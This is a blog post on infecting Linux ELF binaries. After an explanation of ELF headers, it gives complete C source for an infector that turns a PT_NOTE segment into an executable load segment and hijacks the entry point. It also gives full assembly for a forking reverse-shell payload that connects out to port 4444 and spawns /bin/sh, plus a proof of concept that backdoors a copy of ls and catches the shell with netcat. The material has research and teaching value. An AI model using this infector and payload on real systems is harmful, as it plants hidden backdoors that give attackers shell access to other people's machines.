---
title: Infecting Elf Files
Excerpt: 
ShowToc: true
date: 2025-02-23
categories: [ELF, linux, research, development]
tags: [ELF, linux, research, development]
---
## Elfland

Lately I've been thinking about Linux internals and malware. In this blog post, we're going to hark about the ELFs. Just as Windows has its own [executable format](https://www.stephan.onl/2023/08/portable-executable-format-and.html), so too does Linux.

If we look at the source code in glibc's `elf.h` file, we can see the definition of the ELF header and some of its core machinery to get an idea of how it works.

```C
typedef struct elf64_hdr {
  unsigned char e_ident[EI_NIDENT]; /* ELF "magic number" */
  Elf64_Half e_type;
  Elf64_Half e_machine;
  Elf64_Word e_version;
  Elf64_Addr e_entry;       /* Entry point virtual address */
  Elf64_Off e_phoff;        /* Program header table file offset */
  Elf64_Off e_shoff;        /* Section header table file offset */
  Elf64_Word e_flags;
  Elf64_Half e_ehsize;
  Elf64_Half e_phentsize;
  Elf64_Half e_phnum;
  Elf64_Half e_shentsize;
  Elf64_Half e_shnum;
  Elf64_Half e_shstrndx;
} Elf64_Ehdr;

/* These constants define the permissions on sections in the program
   header, p_flags. */
#define PF_R        0x4
#define PF_W        0x2
#define PF_X        0x1


typedef struct elf64_phdr {
  Elf64_Word p_type;
  Elf64_Word p_flags;
  Elf64_Off p_offset;       /* Segment file offset */
  Elf64_Addr p_vaddr;       /* Segment virtual address */
  Elf64_Addr p_paddr;       /* Segment physical address */
  Elf64_Xword p_filesz;     /* Segment size in file */
  Elf64_Xword p_memsz;      /* Segment size in memory */
  Elf64_Xword p_align;      /* Segment alignment, file & memory */
} Elf64_Phdr;

typedef struct elf64_shdr {
  Elf64_Word sh_name;       /* Section name, index in string tbl */
  Elf64_Word sh_type;       /* Type of section */
  Elf64_Xword sh_flags;     /* Miscellaneous section attributes */
  Elf64_Addr sh_addr;       /* Section virtual addr at execution */
  Elf64_Off sh_offset;      /* Section file offset */
  Elf64_Xword sh_size;      /* Size of section in bytes */
  Elf64_Word sh_link;       /* Index of another section */
  Elf64_Word sh_info;       /* Additional section information */
  Elf64_Xword sh_addralign; /* Section alignment */
  Elf64_Xword sh_entsize;   /* Entry size if section holds table */
} Elf64_Shdr;


typedef struct elf64_note {
  Elf64_Word n_namesz;  /* Name size */
  Elf64_Word n_descsz;  /* Content size */
  Elf64_Word n_type;    /* Content type */
} Elf64_Nhdr;
```

"OK, so what?" We're interested in how ELFs work. It turns out they basically use a lookup table. The offset to the program header table is located via `e_phoff`. 

The program header table holds a lot of information. What's important here is that the table controls what values should or shouldn't be loaded into memory at runtime. When an ELF file is executed, it gets mapped by `mmap` according to the addresses specified in the ELF file program headers. If a program header section section is marked `PT_LOAD`, it gets mapped.

For each program header section, the `p_type` field tells the kernel how to interpret the header. For reference: `p_types` and their values:

```plaintext
PT_NULL = 0
PT_LOAD = 1
PT_DYNAMIC = 2
PT_INTERP = 3
PT_NOTE = 4
PT_SHLIB = 5
PT_PHDR = 6
PT_LOPROC = 0x70000000
PT_HIPROC = 0x7fffffff`
```


For example, the `PT_DYNAMIC` field specifies dynamic linking information. And all sections marked as `LOAD` specify loadable segments described by the `p_filesz` and `p_memsz` fields of each program header. If we use `readelf` with the `-l` flag, we can see the headers with each of their respective permission `Flags`: `read`, `write`, or `executable`.



```plaintext
$ readelf -l /usr/bin/ls
Elf file type is DYN (Position-Independent Executable file)
Entry point 0x6d30
There are 13 program headers, starting at offset 64

Program Headers:
  Type           Offset             VirtAddr           PhysAddr
                 FileSiz            MemSiz              Flags  Align
  PHDR           0x0000000000000040 0x0000000000000040 0x0000000000000040
                 0x00000000000002d8 0x00000000000002d8  R      0x8
  INTERP         0x0000000000000318 0x0000000000000318 0x0000000000000318
                 0x000000000000001c 0x000000000000001c  R      0x1
      [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]
  LOAD           0x0000000000000000 0x0000000000000000 0x0000000000000000
                 0x00000000000036f8 0x00000000000036f8  R      0x1000
  LOAD           0x0000000000004000 0x0000000000004000 0x0000000000004000
                 0x0000000000014db1 0x0000000000014db1  R E    0x1000
  LOAD           0x0000000000019000 0x0000000000019000 0x0000000000019000
                 0x00000000000071b8 0x00000000000071b8  R      0x1000
  LOAD           0x0000000000020f30 0x0000000000021f30 0x0000000000021f30
                 0x0000000000001348 0x00000000000025e8  RW     0x1000
  DYNAMIC        0x0000000000021a38 0x0000000000022a38 0x0000000000022a38
                 0x0000000000000200 0x0000000000000200  RW     0x8
  NOTE           0x0000000000000338 0x0000000000000338 0x0000000000000338
                 0x0000000000000030 0x0000000000000030  R      0x8
  NOTE           0x0000000000000368 0x0000000000000368 0x0000000000000368
                 0x0000000000000044 0x0000000000000044  R      0x4
  GNU_PROPERTY   0x0000000000000338 0x0000000000000338 0x0000000000000338
                 0x0000000000000030 0x0000000000000030  R      0x8
  GNU_EH_FRAME   0x000000000001e170 0x000000000001e170 0x000000000001e170
                 0x00000000000005ec 0x00000000000005ec  R      0x4
  GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
                 0x0000000000000000 0x0000000000000000  RW     0x10
  GNU_RELRO      0x0000000000020f30 0x0000000000021f30 0x0000000000021f30
                 0x00000000000010d0 0x00000000000010d0  R      0x1

 Section to Segment mapping:
  Segment Sections...
   00     
   01     .interp 
   02     .interp .note.gnu.property .note.gnu.build-id .note.ABI-tag .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rela.dyn .rela.plt 
   03     .init .plt .plt.got .plt.sec .text .fini 
   04     .rodata .eh_frame_hdr .eh_frame 
   05     .init_array .fini_array .data.rel.ro .dynamic .got .data .bss 
   06     .dynamic 
   07     .note.gnu.property 
   08     .note.gnu.build-id .note.ABI-tag 
   09     .note.gnu.property 
   10     .eh_frame_hdr 
   11     
   12     .init_array .fini_array .data.rel.ro .dynamic .got 
```

The program header section we're interested in is the `NOTE` section. As you can see above, this particular section is not intended to be executable. The `PT_NOTE` segment specifies an auxiliary field for storing information. We can see its construction here. 

For example, a software vendor might desire to mark an executable with information to indicate remarks about compatibility. Together, the `PT_NOTE` section consists of an array of 4-byte words.

```C
/* Note header in a PT_NOTE section */
typedef struct elf64_note {
  Elf64_Word n_namesz;  /* Name size */
  Elf64_Word n_descsz;  /* Content size */
  Elf64_Word n_type;    /* Content type */
} Elf64_Nhdr;
```

The sizes for all of the ELF's corresponding types and sizes can be found in glibc's `elf.h` [source on Elixir](https://elixir.bootlin.com/glibc/glibc-2.41.9000/source/elf/elf.h):


```C
/* Standard ELF types.  */

#include <stdint.h>

/* Type for a 16-bit quantity.  */
typedef uint16_t Elf32_Half;
typedef uint16_t Elf64_Half;

/* Types for signed and unsigned 32-bit quantities.  */
typedef uint32_t Elf32_Word;
typedef int32_t  Elf32_Sword;
typedef uint32_t Elf64_Word;
typedef int32_t  Elf64_Sword;

/* Types for signed and unsigned 64-bit quantities.  */
typedef uint64_t Elf32_Xword;
typedef int64_t  Elf32_Sxword;
typedef uint64_t Elf64_Xword;
typedef int64_t  Elf64_Sxword;

/* Type of addresses.  */
typedef uint32_t Elf32_Addr;
typedef uint64_t Elf64_Addr;

/* Type of file offsets.  */
typedef uint32_t Elf32_Off;
typedef uint64_t Elf64_Off;

/* Type for section indices, which are 16-bit quantities.  */
typedef uint16_t Elf32_Section;
typedef uint16_t Elf64_Section;

/* Type for version symbol information.  */
typedef Elf32_Half Elf32_Versym;
typedef Elf64_Half Elf64_Versym;
```


If we want to see the `PT_NOTE` or `SHT_NOTE` segments of ELF binaries for ourselves, we can glean them using the `readelf` utility with the `-n` or `--notes` flag. 

```plaintext
$ readelf -n /usr/bin/ls

Displaying notes found in: .note.gnu.property
  Owner                Data size    Description
  GNU                  0x00000020   NT_GNU_PROPERTY_TYPE_0
      Properties: x86 feature: IBT, SHSTK
    x86 ISA needed: x86-64-baseline

Displaying notes found in: .note.gnu.build-id
  Owner                Data size    Description
  GNU                  0x00000014   NT_GNU_BUILD_ID (unique build ID bitstring)
    Build ID: 3eca7e3905b37d48cf0a88b576faa7b95cc3097b

Displaying notes found in: .note.ABI-tag
  Owner                Data size    Description
  GNU                  0x00000010   NT_GNU_ABI_TAG (ABI version tag)
    OS: Linux, ABI: 3.2.0
```

## Constructing an Infector

Now that we have a better idea about how ELF files are structured and operate, we can elaborate and clarify our objectives with a bit more precision than before. What do we want to do? First we need to read and write.


And before we can do that, we need to set some declarations based on the ELF structure so that we have gadgets to do so:

```C
Elf64_Ehdr* read_elf64_header(int fd);
Elf64_Phdr* read_elf64_program_headers(int fd, uint64_t phoff, uint16_t phnum);
int write_elf64_program_headers(int fd, uint64_t phoff, uint16_t phnum, Elf64_Phdr *phdrs);
int write_elf64_header(int fd, Elf64_Ehdr *header);
unsigned char* read_file(const char *filename, size_t *length);
void write_u64_le(unsigned char *dest, uint64_t val);
void patch(unsigned char **shellcode, size_t *shellcode_len, uint64_t entry_point, uint64_t start_offset);
```

We want to open and read both an ELF binary and a shellcode file to some allocated memory buffers. Our `main` function:

```C
int main(int argc, char **argv) {
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <ELF File> <Shellcode File>\n", argv[0]);
        exit(1);
    }

    const char *elf_path = argv[1];
    const char *bin_path = argv[2];

    // Open ELF file with RW permissions
    int elf_fd = open(elf_path, O_RDWR);
    if (elf_fd < 0) {
        fprintf(stderr, "Error opening ELF file '%s': %s\n", elf_path, strerror(errno));
        exit(1);
    }

    // Load shellcode from file
    size_t shellcode_len = 0;
    unsigned char *shellcode = read_file(bin_path, &shellcode_len);
    if (shellcode == NULL) {
        fprintf(stderr, "Error reading shellcode file '%s'\n", bin_path);
        close(elf_fd);
        exit(1);
    }

    // Parse ELF and program headers
    Elf64_Ehdr *elf_header = read_elf64_header(elf_fd);
    if (elf_header == NULL) {
        fprintf(stderr, "Error reading ELF header\n");
        close(elf_fd);
        free(shellcode);
        exit(1);
    }

    Elf64_Phdr *program_headers = read_elf64_program_headers(elf_fd, elf_header->e_phoff, elf_header->e_phnum);
    if (program_headers == NULL) {
        fprintf(stderr, "Error reading program headers\n");
        close(elf_fd);
        free(elf_header);
        free(shellcode);
        exit(1);
    }
```

Our call to `read_file` returns a pointer to our shellcode buffer. We get its size with `fread` and store it in `*length`.

```C
// Read entire contents of a file into a dynamically allocated buffer
// File length is stored in *length
// Return pointer to buffer on success, or NULL on failure

unsigned char* read_file(const char *filename, size_t *length) {
    FILE *fp = fopen(filename, "rb");
    if (fp == NULL) {
        fprintf(stderr, "Error opening file '%s': %s\n", filename, strerror(errno));
        return NULL;
    }
    if (fseek(fp, 0, SEEK_END) != 0) {
        fprintf(stderr, "Error seeking in file '%s'\n", filename);
        fclose(fp);
        return NULL;
    }
    long file_size = ftell(fp);
    if (file_size < 0) {
        fprintf(stderr, "Error getting file size for '%s'\n", filename);
        fclose(fp);
        return NULL;
    }
    rewind(fp);
    unsigned char *buffer = malloc(file_size);
    if (buffer == NULL) {
        fprintf(stderr, "Error allocating memory for file '%s'\n", filename);
        fclose(fp);
        return NULL;
    }
    size_t read_size = fread(buffer, 1, file_size, fp);
    if (read_size != (size_t)file_size) {
        fprintf(stderr, "Error reading file '%s'\n", filename);
        free(buffer);
        fclose(fp);
        return NULL;
    }
    fclose(fp);
    *length = read_size;
    return buffer;
}
```

After returning from our call to `read_file` to get the shellcode buffer and length, we're ready to call our ELF helper functions to parse both the ELF header and its program headers. We use `lseek` and `SEEK_SET` to get the beginning of our ELF binary header and its program headers:

```C
// Read the ELF64 header from the given file descriptor
// Return a pointer to an allocated Elf64_Ehdr structure on success, or NULL on failure
Elf64_Ehdr* read_elf64_header(int fd) {
    if (lseek(fd, 0, SEEK_SET) < 0) {
        fprintf(stderr, "Error seeking to beginning of ELF file\n");
        return NULL;
    }
    Elf64_Ehdr *header = malloc(sizeof(Elf64_Ehdr));
    if (header == NULL) {
        fprintf(stderr, "Error allocating memory for ELF header\n");
        return NULL;
    }
    if (read(fd, header, sizeof(Elf64_Ehdr)) != sizeof(Elf64_Ehdr)) {
        fprintf(stderr, "Error reading ELF header\n");
        free(header);
        return NULL;
    }
    return header;
}


// Read ELF64 program headers from the given file descriptor at offset phoff
// expecting phnum headers 
// Return a pointer to an allocated array of program headers
// or NULL on failure

Elf64_Phdr* read_elf64_program_headers(int fd, uint64_t phoff, uint16_t phnum) {
    if (lseek(fd, phoff, SEEK_SET) < 0) {
        fprintf(stderr, "Error seeking to program headers offset\n");
        return NULL;
    }
    Elf64_Phdr *phdrs = malloc(sizeof(Elf64_Phdr) * phnum);
    if (phdrs == NULL) {
        fprintf(stderr, "Error allocating memory for program headers\n");
        return NULL;
    }
    size_t total_size = sizeof(Elf64_Phdr) * phnum;
    if (read(fd, phdrs, total_size) != (ssize_t)total_size) {
        fprintf(stderr, "Error reading program headers from ELF file\n");
        free(phdrs);
        return NULL;
    }
    return phdrs;
}

```


After we've looped through the headers and allocated them to memmory with `malloc` we land back in `main` once more. Now we do a few important things. First we store the original `e_entry` of the ELF header in `original entry`.

Then we get the file size of the target ELF binary with `stat` by accessing `st_size`. We save this physical file size offset in `file_offset`. We then generate a `memory_offset` using a high address by adding `0xc00000000` to our `file_offset`. This `memory_offset` is where we want to load our shellcode to. And it's where we're going to point our new `e_entry` to.

We then call the `patch` function. It takes our shellcode, shellcode length, memory_offset, and the original entry point. This is really important because it appends some additional shellcode to our shellcode buffer and which helps us jump back to the original ELF entry point. 

However, this change inevitably alters our shellcode buffer and length. So after the patch function returns, we update the length `sc_len` to point to our updated `shellcode_len` before modifying the program headers. We do this so when we modify the program headers, the `sc_len` will be the correctly adjusted size.

```C

    // Save the old entry point so we can jump later
    uint64_t original_entry = elf_header->e_entry;

    // Calculate offsets for patching the ELF and program headers
    struct stat st;
    if (fstat(elf_fd, &st) != 0) {
        fprintf(stderr, "Error getting ELF file metadata: %s\n", strerror(errno));
        close(elf_fd);
        free(elf_header);
        free(program_headers);
        free(shellcode);
        exit(1);
    }
    uint64_t file_offset = st.st_size;
    uint64_t memory_offset = 0xc00000000ULL + file_offset;

    // Patch shellcode to jump to the original entry point after finishing
    patch(&shellcode, &shellcode_len, memory_offset, original_entry);

    // Update sc_len to patched length
    uint64_t sc_len = (uint64_t)shellcode_len;

    // Look for PT_NOTE section
    for (int i = 0; i < elf_header->e_phnum; i++) {
        if (program_headers[i].p_type == PT_NOTE) {
            // Convert to a PT_LOAD section with values to load shellcode
            printf("[+] Found PT_NOTE section\n");
            printf("[+] Changing to PT_LOAD\n");
            program_headers[i].p_type = PT_LOAD;
            program_headers[i].p_flags = PF_R | PF_X;
            program_headers[i].p_offset = file_offset;
            program_headers[i].p_vaddr = memory_offset;
            program_headers[i].p_memsz += sc_len;
            program_headers[i].p_filesz += sc_len;
            // Patch the ELF header to start at the shellcode
            elf_header->e_entry = memory_offset;
            printf("[+] Patched e_entry\n");
            break;
        }
    }
```

Below is the patch function. The `jump_shellcode` array is actually a small assembly program that uses a trick to help us return to the original entry point. 

Remember, we call the patch function from `main` with the variables we need to patch the array to make it work. We pass our shellcode buffer, shellcode length, memory_offset (which is where our new `e_entry`  will point!), and the original entry point.

```C
// From main, we call the patch function 

patch(&shellcode, &shellcode_len, memory_offset, original_entry);

```

The array is the shellcode of a small assembly program. And all we're doing is patching in the bytes so that when it runs, it does so using the values we've provided.

```C

// Patch in shellcode from jumpstart.s to resolve start_offset

void patch(unsigned char **shellcode, size_t *shellcode_len, uint64_t entry_point, uint64_t start_offset) {
   
    unsigned char jump_shellcode[] = {
        0xe8, 0x2d, 0x00, 0x00, 0x00, 0x49, 0xb9, 0xef, 0xbe, 0xad, 0xde, 0xef, 0xbe, 0xad, 0xde,
        0x49, 0xba, 0x0d, 0xf0, 0xad, 0xba, 0x0d, 0xf0, 0xad, 0xba, 0x49, 0xbb, 0xb5, 0x00, 0x6b,
        0xb1, 0xb5, 0x00, 0x6b, 0xb1, 0x4c, 0x29, 0xc8, 0x48, 0x83, 0xe8, 0x05, 0x4c, 0x29, 0xd0,
        0x4c, 0x01, 0xd8, 0xff, 0xe0, 0x48, 0x8b, 0x04, 0x24, 0xc3
    };
    // Write values using little-endian ordering
    write_u64_le(&jump_shellcode[7], (uint64_t)(*shellcode_len));
    write_u64_le(&jump_shellcode[17], entry_point);
    write_u64_le(&jump_shellcode[27], start_offset);

    // Extend shellcode vector by appending the jump_shellcode size;
    // Realloc new size, memcpy jump_shellcode into new_shellcode
    size_t new_len = *shellcode_len + sizeof(jump_shellcode);
    unsigned char *new_shellcode = realloc(*shellcode, new_len);
    if (new_shellcode == NULL) {
        fprintf(stderr, "Error reallocating shellcode buffer\n");
        free(*shellcode);
        exit(1);
    }
    memcpy(new_shellcode + *shellcode_len, jump_shellcode, sizeof(jump_shellcode));
    *shellcode = new_shellcode;
    *shellcode_len = new_len;
}
```

The source code of the array is this trick from an old e-zine. It takes our virus size, new entry, and original start_offset and uses a bit of math to find out where its relative addressing. Each time a modern binary runs, ASLR and position-independent executables have their addresses semi-randomized.

What our assembly program does here is provide some quasi-random seeds in the form of `defined` constants. When our array gets patched, it tells it to run this assembly program using the values that have been patched into it.

The randomness of our constants means that when the patch happens, the addresses are guaranteed to be unique. Where our shellcode ends, this `jump_shellcode.s` program begins. We first call `get_foo` and store the stack pointer and store it in `rax`. We then move our constants to registers `r9`, `r10`, and `r11`. 

Then we do the following trick: we substract the size of our malware `VSIZE` from the stack pointer in `rax`. Then we subtract `5` to accomadte for the size of the `get_foo` instruction itself. Then we subtract the patched `entry` offset. 

And last, we add the original entry `start` offset to `rax` Now we can jump back to the original entry point, every time, even though the executable is position independent.


```asm
BITS 64
%define VSIZE 0xDEADBEEFDEADBEEF   
%define ENTRY 0xBAADF00DBAADF00D
%define START 0xB16B00B5B16B00B5   

    ; - position independent executables move addresses, so
    ; 1) call to get_foo instruction pointer into rax then 
    ; 2) load our constants into registers r9, r10, r11
    ; 3) sub that address from our malware size minus 5! 
    ;   *(the size of the get_foo instruction)
    ; 4) sub rax from entry to get the new relative
    ;    entry address
    ; 5) add the difference with rax and r11
    ;   *(r11, the original e_hdr.entry)
    ; 6) finally jmp to rax
    call get_foo
    mov r9, VSIZE
    mov r10, ENTRY
    mov r11, START
    sub rax, r9
    sub rax, 5
    sub rax, r10
    add rax, r11
    jmp rax
get_foo:
    mov rax, [rsp]
    ret
```

## Assembling Shellcode

Embarrassingly, it took me a little while to get a reliable payload working. Initially, my program would segfault and I thought I messed up the infector. At another point, it would segfault while the shell would survive. And as I got closer, it would sometimes *almost* work, but still segfault.

```plaintext
hexagr@vr:~/master/research$ ./ls
Segmentation fault (core dumped)
hexagr@vr:~/master/research$ ./ls
Segmentation fault (core dumped)
hexagr@vr:~/master/research$ ./ls
elf_infector  maybe    maybe2    maybe3.s  maybe4.s  maybe5.s  maybe6.s  maybe7.s  maybe8.s
ls        maybe.s  maybe2.s  maybe4    maybe5    maybe6    maybe7    maybe8
Segmentation fault (core dumped)
hexagr@vr:~/master/research$ ./ls
elf_infector  maybe    maybe2    maybe3.s  maybe4.s  maybe5.s  maybe6.s  maybe7.s  maybe8.s
ls        maybe.s  maybe2.s  maybe4    maybe5    maybe6    maybe7    maybe8
Segmentation fault (core dumped)
hexagr@vr:~/master/research$ ./ls
Segmentation fault (core dumped)
hexagr@vr:~/master/research$ ./ls
elf_infector  maybe    maybe2    maybe3.s  maybe4.s  maybe5.s  maybe6.s  maybe7.s  maybe8.s
ls        maybe.s  maybe2.s  maybe4    maybe5    maybe6    maybe7    maybe8
Segmentation fault (core dumped)


(╯°□°）╯︵ ┻━┻

``` 

One issue was the way that I originally ordered the logic of the `fork`. Initially I tried to jump into the `fork` and I messed up the logical order of things. Then I realized that you could just spawn it and return to the parent process prettty easily. 

The other issues were with `ret` sometimes messing up the stack alignment. If you can call `ret` at the end when returning to the parent process, it messes up the stack. 

Eventually, I realized that the answer to all of this was a lot more straight forward and that my approach to using `fork` to spawn a process in the background could be improved, and that the stack could in fact be preserved and restored in a reliable way. 

After a bit of trial and error -- and correctly returning the stack pointer, the shellcode seems reliable now. In the end, the successful assembly code I ended up creating goes something like this: 

First, we try to preserve the behavior of the infected host binary by saving all of the registers by pushing them to the stack, along with the stack pointer.

Only then do we try to call the `fork` syscall. The `child_process` then spawns off where it prepares its networking code.

Inside the forked `child_process`, we prepare to use the `connect` syscall by setting up the `AF_INET`, `SOCK_STREAM`, and `IPPROTOC_TCP` arguments.

If the socket setup fails, our `child_process` -- now separated from the parent -- fails silently. Otherwise, we likely have a good file descriptor and so we move it to `rdi`. 

Continuing, we `xor` the `rdx` register clearing it before pushing it to the stack as a `NULL` pad, before pushing the address we want to connect to. Here, we just use localhost, `127.0.0.1`, and our chosen port `4444`. 

We push the AF_INET (address family) `2`, then move the stack pointer to `rsi` for the `sockaddr` pointer and set it to its correct structure size of 16 bytes. 

We make the syscall and if it fails, we exit. Otherwise, we setup to duplicate the file descriptor with `dup2` and move on to execute our shell.

>*dup2 doesn't switch the file descriptors, it makes them equivalent. After dup2(f1, 0), whatever file was opened on descriptor f1 is now also opened (with the same mode and position) on descriptor 0, i.e. on standard input.*

>*If the target file descriptor was open, it is closed by the dup2 call. This is useful (among other things) when you have part of a program that reads or write from the standard file descriptors. For example, suppose that somefunc() reads from standard input, but you want it to read from a different file from where the rest of the program is getting its standard input. Then you can do (error checking omitted):*


```C
int save_stdin = dup(0);
int somefunc_input_fd = open("input-for-somefunc.data", O_RDONLY);
dup2(somefunc_input_fd, 0);
/* Now the original stdin is open on save_stdin, and input-for-somefunc.data on 
both somefunc_input_fd and 0. */
somefunc();
close(somefunc_input_fd);
dup2(save_stdin, 0);
close(save_stdin);
```

This insight brought to you by netizen ***Gilles 'SO- stop being evil', StackOverflow***


`Dup2` lets us duplicate the file descriptor to handle `stdin`, `stdout`, and `stderr` pipes. After we decrement through the loop, we can use them with a shell.

So we build the `/bin/sh` pathname array and move it to `rbx`, followed by the *path* to the *argument* of the *pathname*!

Our final code looks like this, with `execve("/bin/sh", ["/bin/sh"], NULL)`. If all goes well, we receive a shell on our listener and the original behavior of our infected host program is preserved.


```asm
BITS 64
global _start

section .text
_start:
                                ; save original stack pointer 
    mov r12, rsp                ; preserve rsp in r12

                                ; save all registers
    push rax
    push rbx
    push rcx
    push rdx
    push rsi
    push rdi
    push rbp
    push r8
    push r9
    push r10
    push r11

                                ; fork to isolate shellcode execution
    mov rax, 57                 ; sys_fork
    syscall
    test rax, rax
    jnz parent                  ; parent continues host execution

child_process:
                                ; socket syscall
                                ; int socket(int domain, int type, int protocol)
    mov rax, 41                 ; sys_socket
    mov rdi, 2                  ; AF_INET
    mov rsi, 1                  ; SOCK_STREAM
    mov rdx, 6                  ; IPPROTO_TCP
    syscall
    cmp rax, 0
    jl exit                     ; if socket fails, exit

                                ; save socket file descriptor in rdi
    mov rdi, rax

                                ; connect syscall
                                ; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
    mov rax, 42                 ; sys_connect
                                ; build sockaddr_in structure on the stack
    xor rdx, rdx
    push rdx                    ; null pad
    push dword 0x0100007f       ; 127.0.0.1, ip address
    push word 0x5c11            ; port 4444, network byte order
    push word 2                 ; AF_INET
    mov rsi, rsp                ; pointer to sockaddr_in structure
    mov rdx, 16                 ; size of sockaddr_in
    syscall
    cmp rax, 0
    jl exit                     ; if connect fails, exit

                                ; dup2 syscall: int dup2(int oldfd, int newfd)
    mov rsi, 3                  ; Start with stderr (2), work down to stdin (0)
dup2_loop:
    dec rsi                     ; Decrement file descriptor (2 -> 1 -> 0)
    mov rax, 33                 ; sys_dup2
    syscall
    jnz dup2_loop               ; loop until rsi is 0

                                ; execve syscall
                                ; int execve(const char *pathname, char *const argv[], char *const envp[])
    xor rax, rax
    push rax                    ; NULL terminator
    mov rbx, 0x68732f6e69622f2f ; "//bin/sh" in reverse byte order
    push rbx
    mov rdi, rsp                ; Pathname pointer

    push rax                    ; NULL terminator for argv
    push rdi                    ; pointer to the string "//bin/sh"
    mov rsi, rsp                ; argv -> [pointer_to_string, NULL]
    xor rdx, rdx                ; envp ->NULL
    mov al, 59                  ; syscall, execve
    syscall

                                ; if execve fails, exit
exit:
    xor rax, rax
    mov al, 60                  ; sys_exit
    xor rdi, rdi
    syscall

parent:
                                ; restore registers and continue host execution
    pop r11
    pop r10
    pop r9
    pop r8
    pop rbp
    pop rdi
    pop rsi
    pop rdx
    pop rcx
    pop rbx
    pop rax
    mov rsp, r12                ; restore stack pointer



```

The last thing we do in order to ensure our exploit runs smoothly is `pop` all of our registers back in proper reverse order to how we pushed them and move the stack pointer we saved earlier in `r12` back to `rsp`.


## Proof of Concept

```plaintext
hexagr@vr:~/elf$ gcc -o elf_infector elf_infector.c
hexagr@vr:~/elf$ cp $(which ls) ls
hexagr@vr:~/elf$ nasm -o shellcode shellcode.s
hexagr@vr:~/elf$ ./elf_infector ./ls shellcode
[+] Found PT_NOTE section
[+] Changing to PT_LOAD
[+] Patched e_entry
hexagr@vr:~/elf$ ./ls
elf_infector  elf_infector.c  ls  shellcode  shellcode.s
```

Meanwhile... in our other console

```plaintext
hexagr@vr:~/elf$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 127.0.0.1 51020
cat /etc/issue
Ubuntu 24.04.2 LTS \n \l

uname -a
Linux vr 6.8.0-53-generic #55-Ubuntu SMP PREEMPT_DYNAMIC Fri Jan 17 15:37:52 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux


```


[ELF Infector on Github](https://github.com/hexagr/elf_infector)